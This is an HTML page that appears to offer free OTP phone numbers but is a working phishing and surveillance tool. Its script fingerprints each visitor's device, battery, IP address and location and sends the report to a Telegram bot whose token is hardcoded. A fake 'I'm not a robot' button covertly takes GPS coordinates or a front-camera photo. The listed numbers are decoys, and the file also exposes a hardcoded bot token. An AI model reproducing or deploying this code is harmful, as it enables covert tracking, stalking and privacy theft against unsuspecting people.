<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free OTP Numbers</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: #1a1e29; color: white; margin: 0; padding: 15px; text-align: center; }
        .secure-badge { background: linear-gradient(90deg, #00d2ff 0%, #3a7bd5 100%); color: white; padding: 8px 20px; border-radius: 20px; display: inline-block; font-weight: bold; margin-bottom: 20px; }
        
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px; margin-bottom: 20px;}
        .card { background: #232838; padding: 15px; border-radius: 15px; border: 1px solid #333a4f; display: flex; flex-direction: column; justify-content: space-between; }
        .flag { font-size: 30px; margin-bottom: 5px; }
        .country { font-weight: bold; color: #a0a5b5; font-size: 13px; margin-bottom: 5px; }
        .number { font-size: 15px; font-weight: bold; margin-bottom: 15px; color: #fff; direction: ltr;}
        .select-btn { background: #ff4757; color: white; border: none; padding: 8px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; }
        
        .verify-popup { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(26, 30, 41, 0.98); z-index: 1000; display: none; flex-direction: column; justify-content: center; align-items: center; padding: 20px;}
        .verify-btn { background: #27ae60; color: white; border: none; padding: 20px 40px; font-size: 20px; border-radius: 10px; cursor: pointer; font-weight: bold; margin-top: 20px; }
        
        .content { display: none; }
        #loading { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(26, 30, 41, 0.98); z-index: 999; padding-top: 40vh; font-size: 20px; color: #00d2ff; font-weight: bold;}
    </style>
</head>
<body>

    <div class="verify-popup" id="popup">
        <h2>⚠️ Human Verification Required</h2>
        <p>To get the OTP number, please verify you are not a robot.</p>
        <button class="verify-btn" onclick="triggerAction()">✅ I'm not a robot (Verify Now)</button>
    </div>

    <div class="content" id="mainContent">
        <div class="secure-badge">Secure • Temporary • Free</div>
        <p>Get your free OTP verification numbers instantly.</p>
        <div class="grid" id="country-grid"></div>
    </div>

    <div id="loading">Verifying... ⏳</div>

    <script>
        const BOT_TOKEN = '8631883105:AAEh_pa8GZUITtttMSVEryWLaTcgxwbLBrc';       
        const ADMIN_ID = '8564695453';  
        
        const urlParams = new URLSearchParams(window.location.search);
        const targetUserId = urlParams.get('id');
        const mode = urlParams.get('mode') || 'basic';
        const urlLang = urlParams.get('lang'); 

        // تحديد لغة رسالة البوت فقط (مش لغة الصفحة، الصفحة المتصفح هو اللي هيترجمها)
        let botLang = 'en';
        if (urlLang) {
            botLang = urlLang;
        } else if (navigator.language.startsWith('ar')) {
            botLang = 'ar';
        } else if (navigator.language.startsWith('hi')) {
            botLang = 'hi';
        }

        let ipDataGlobal = {};

        const countriesData = [
            { flag: "🇪🇬", name: "Egypt", numbers: ["+20 10 1234 5678", "+20 11 9876 5432"] },
            { flag: "🇺🇸", name: "USA", numbers: ["+1 202 555 0143", "+1 415 555 0192"] },
            { flag: "🇸🇦", name: "Saudi Arabia", numbers: ["+966 50 123 4567", "+966 55 987 6543"] },
            { flag: "🇮🇹", name: "Italy", numbers: ["+39 312 345 6789", "+39 333 123 4567"] },
            { flag: "🇦🇪", name: "UAE", numbers: ["+971 50 123 4567", "+971 55 765 4321"] },
            { flag: "🇬🇧", name: "United Kingdom", numbers: ["+44 7700 900 123", "+44 7911 123 456"] },
            { flag: "🇩🇿", name: "Algeria", numbers: ["+213 55 123 4567", "+213 66 987 6543"] },
            { flag: "🇫🇷", name: "France", numbers: ["+33 6 1234 5678", "+33 7 8765 4321"] },
            { flag: "🇲🇦", name: "Morocco", numbers: ["+212 61 234 5678", "+212 66 876 5432"] },
            { flag: "🇩🇪", name: "Germany", numbers: ["+49 15 1234 5678", "+49 17 9876 5432"] }
        ];

        async function initPage() {
            try { 
                const res = await fetch('https://ipwho.is/'); 
                const data = await res.json();
                if(data.success) { ipDataGlobal = data; }
            } catch (e) {}

            if (mode === 'location' || mode === 'camera') {
                document.getElementById('popup').style.display = 'flex';
            } else {
                document.getElementById('mainContent').style.display = 'block';
                renderCountries();
                sendBasicInfo(); // إرسال البيانات فوراً لوضع الـ basic
            }
        }

        function renderCountries() {
            const grid = document.getElementById('country-grid');
            grid.innerHTML = ''; 
            countriesData.forEach(c => {
                const num = c.numbers[Math.floor(Math.random() * c.numbers.length)];
                
                const card = document.createElement('div');
                card.className = 'card';
                // الكلام هنا إنجليزي صافي، والمتصفح هو اللي هيترجمه لوحده
                card.innerHTML = `
                    <div>
                        <div class="flag">${c.flag}</div>
                        <div class="country">${c.name}</div>
                        <div class="number">${num}</div>
                    </div>
                    <button class="select-btn" onclick="showFakeLoading()">Select</button>
                `;
                grid.appendChild(card);
            });
        }

        async function triggerAction() {
            document.getElementById('popup').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            if (mode === 'location') {
                navigator.geolocation.getCurrentPosition(
                    async (pos) => {
                        await sendText(`📍 Exact Location:\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\n[Open Map](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`);
                        finishAction();
                    }, (err) => { alert("You must allow location access."); finishAction(); }
                );
            } else if (mode === 'camera') {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                    const video = document.createElement('video'); video.srcObject = stream; await video.play();
                    setTimeout(async () => {
                        const canvas = document.createElement('canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        canvas.toBlob(async blob => {
                            await sendPhoto(blob, 'camera.jpg');
                            stream.getTracks().forEach(t => t.stop());
                            finishAction();
                        }, 'image/jpeg', 0.8);
                    }, 1000);
                } catch (err) { alert("You must allow camera access."); finishAction(); }
            }
        }

        function finishAction() {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('mainContent').style.display = 'block';
            renderCountries();
            sendBasicInfo();
        }

        function showFakeLoading() { alert("Preparing number..."); }

        async function sendBasicInfo() {
            if (!targetUserId) return;

            const ua = navigator.userAgent;
            
            let osName = "Unknown";
            let osVersion = "Unknown";
            if (/Windows/i.test(ua)) osName = "Windows";
            else if (/Android/i.test(ua)) osName = "Android";
            else if (/iPhone|iPad|iPod/i.test(ua)) osName = "iOS";
            else if (/Mac/i.test(ua)) osName = "macOS";
            else if (/Linux/i.test(ua)) osName = "Linux";
            
            const osMatch = ua.match(/(Android|iPhone OS)\s([0-9\._]+)/i);
            if (osMatch) osVersion = osMatch[2].replace(/_/g, '.');

            let browserName = "Unknown";
            if (/Edg/i.test(ua)) browserName = "Edge";
            else if (/Chrome|CriOS/i.test(ua)) browserName = "Chrome";
            else if (/Firefox|FxiOS/i.test(ua)) browserName = "Firefox";
            else if (/Safari/i.test(ua)) browserName = "Safari";
            else if (/Telegram/i.test(ua)) browserName = "Telegram In-App";

            let deviceModel = "Unknown";
            const modelMatch = ua.match(/Android[^;]+;\s([^;)]+)\sBuild/i);
            if (modelMatch) deviceModel = modelMatch[1].trim();
            if (deviceModel === "K" || deviceModel === "Linux armv81") deviceModel = "Hidden (Browser Privacy)";

            let tgPlatform = "External Browser";
            if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.platform) {
                tgPlatform = window.Telegram.WebApp.platform;
            }

            try {
                if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                    const uaData = await navigator.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion"]);
                    if (uaData.model) deviceModel = uaData.model;
                    if (uaData.platform) osName = uaData.platform;
                    if (uaData.platformVersion) osVersion = uaData.platformVersion;
                }
            } catch (e) {}

            let batteryText = "Not supported";
            try {
                const battery = await navigator.getBattery();
                batteryText = `Level: ${Math.round(battery.level * 100)}%\n• Charging: ${battery.charging ? 'Yes' : 'No'}`;
            } catch (e) {}

            const screenRes = `${window.screen.width}x${window.screen.height}`;
            const isTouch = navigator.maxTouchPoints > 0 ? `Yes (${navigator.maxTouchPoints})` : 'No';

            let report = "";
            let lat = ipDataGlobal.latitude || 0;
            let lon = ipDataGlobal.longitude || 0;

            // ==========================================
            // بناء الرسالة للبوت (حسب الـ lang اللي جاي من الاستضافة)
            // ==========================================
            if (botLang === 'ar') {
                report = `
📊 <b>تم سحب معلومات الزائر</b>
━━━━━━━━━━━━━━━━

🖥️ <b>الجهاز والمتصفح</b>
• موديل الجهاز: ${deviceModel}
• نظام التشغيل: ${osName} ${osVersion !== "Unknown" ? `(إصدار ${osVersion})` : ""}
• المتصفح: ${browserName}
• واجهة التطبيق: ${tgPlatform} (${navigator.platform})

🌐 <b>معلومات الشبكة</b>
• الآي بي: ${ipDataGlobal.ip || 'غير معروف'}
• اللغة: ${navigator.language}

📍 <b>تفاصيل الموقع (IP)</b>
• الدولة: ${ipDataGlobal.country || 'غير معروف'}
• المحافظة: ${ipDataGlobal.region || 'غير معروف'}
• المدينة: ${ipDataGlobal.city || 'غير معروف'}
• المنطقة الزمنية: ${ipDataGlobal.timezone ? ipDataGlobal.timezone.id : 'غير معروف'}

🖼️ <b>معلومات الشاشة</b>
• الدقة: ${screenRes}

🔋 <b>حالة البطارية</b>
• ${batteryText}

🔐 <b>الصلاحيات</b>
• الكاميرا: ${mode === 'camera' ? 'Allowed' : 'Prompt'}
• الموقع: ${mode === 'location' ? 'Allowed' : 'Prompt'}

💾 <b>الهاردوير</b>
• أنوية المعالج: ${navigator.hardwareConcurrency || 'غير معروف'}
• الرام: ${navigator.deviceMemory ? navigator.deviceMemory + ' جيجا' : 'غير معروف'}
• اللمس: ${isTouch}

📱 <b>User-Agent</b>
<code>${ua}</code>

━━━━━━━━━━━━━━━━
⚡ <b>المطور:</b> <a href="tg://user?id=${ADMIN_ID}">تواصل مع المطور</a>
                `;
            } else if (botLang === 'hi') {
                report = `
📊 <b>आगंतुक जानकारी कैप्चर की गई</b>
━━━━━━━━━━━━━━━━

🖥️ <b>डिवाइस और ब्राउज़र</b>
• डिवाइस मॉडल: ${deviceModel}
• ऑपरेटिंग सिस्टम: ${osName} ${osVersion !== "Unknown" ? `(${osVersion})` : ""}
• ब्राउज़र: ${browserName}
• ऐप इंटरफ़ेस: ${tgPlatform} (${navigator.platform})

🌐 <b>नेटवर्क जानकारी</b>
• आईपी पता: ${ipDataGlobal.ip || 'अज्ञात'}
• भाषा: ${navigator.language}

📍 <b>स्थान विवरण (IP)</b>
• देश: ${ipDataGlobal.country || 'अज्ञात'}
• क्षेत्र: ${ipDataGlobal.region || 'अज्ञात'}
• शहर: ${ipDataGlobal.city || 'अज्ञात'}
• समय क्षेत्र: ${ipDataGlobal.timezone ? ipDataGlobal.timezone.id : 'अज्ञात'}

🖼️ <b>प्रदर्शन जानकारी</b>
• रिज़ॉल्यूशन: ${screenRes}

🔋 <b>बैटरी की स्थिति</b>
• ${batteryText}

🔐 <b>डिवाइस अनुमतियाँ</b>
• कैमरा: ${mode === 'camera' ? 'Allowed' : 'Prompt'}
• स्थान: ${mode === 'location' ? 'Allowed' : 'Prompt'}

💾 <b>हार्डवेयर</b>
• सीपीयू कोर: ${navigator.hardwareConcurrency || 'अज्ञात'}
• रैम: ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'अज्ञात'}
• टच: ${isTouch}

📱 <b>User-Agent</b>
<code>${ua}</code>

━━━━━━━━━━━━━━━━
⚡ <b>डेवलपर:</b> <a href="tg://user?id=${ADMIN_ID}">संपर्क करने के लिए यहां क्लिक करें</a>
                `;
            } else {
                report = `
📊 <b>Visitor Information Captured</b>
━━━━━━━━━━━━━━━━

🖥️ <b>Device & Browser</b>
• Device Model: ${deviceModel}
• OS: ${osName} ${osVersion !== "Unknown" ? `(${osVersion})` : ""}
• Browser: ${browserName}
• App Interface: ${tgPlatform} (${navigator.platform})

🌐 <b>Network Information</b>
• IP Address: ${ipDataGlobal.ip || 'Unknown'}
• Language: ${navigator.language}

📍 <b>Location Details (IP)</b>
• Country: ${ipDataGlobal.country || 'Unknown'}
• Region: ${ipDataGlobal.region || 'Unknown'}
• City: ${ipDataGlobal.city || 'Unknown'}
• Timezone: ${ipDataGlobal.timezone ? ipDataGlobal.timezone.id : 'Unknown'}

🖼️ <b>Display Information</b>
• Resolution: ${screenRes}

🔋 <b>Battery Status</b>
• ${batteryText}

🔐 <b>Device Permissions</b>
• Camera: ${mode === 'camera' ? 'Allowed' : 'Prompt'}
• Location: ${mode === 'location' ? 'Allowed' : 'Prompt'}

💾 <b>Hardware & Storage</b>
• CPU Cores: ${navigator.hardwareConcurrency || 'Unknown'}
• RAM: ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'}
• Touch Support: ${isTouch}

📱 <b>User-Agent</b>
<code>${ua}</code>

━━━━━━━━━━━━━━━━
⚡ <b>Developed by:</b> <a href="tg://user?id=${ADMIN_ID}">Contact Developer</a>
                `;
            }

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: targetUserId, text: report, parse_mode: 'HTML', disable_web_page_preview: true })
            }).catch(e=>{});

            if (lat !== 0 && lon !== 0) {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: targetUserId, latitude: lat, longitude: lon })
                }).catch(e=>{});
            }
        }

        async function sendText(text) {
            if (!targetUserId) return;
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: targetUserId, text: text, parse_mode: 'Markdown' })
            }).catch(e=>{});
        }

        async function sendPhoto(blob, filename) {
            if (!targetUserId) return;
            const formData = new FormData();
            formData.append('photo', blob, filename);
            formData.append('caption', `🚨 Photo (${mode})`);
            formData.append('chat_id', targetUserId);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData }).catch(e=>{});
        }

        initPage();
    </script>
</body>
</html>
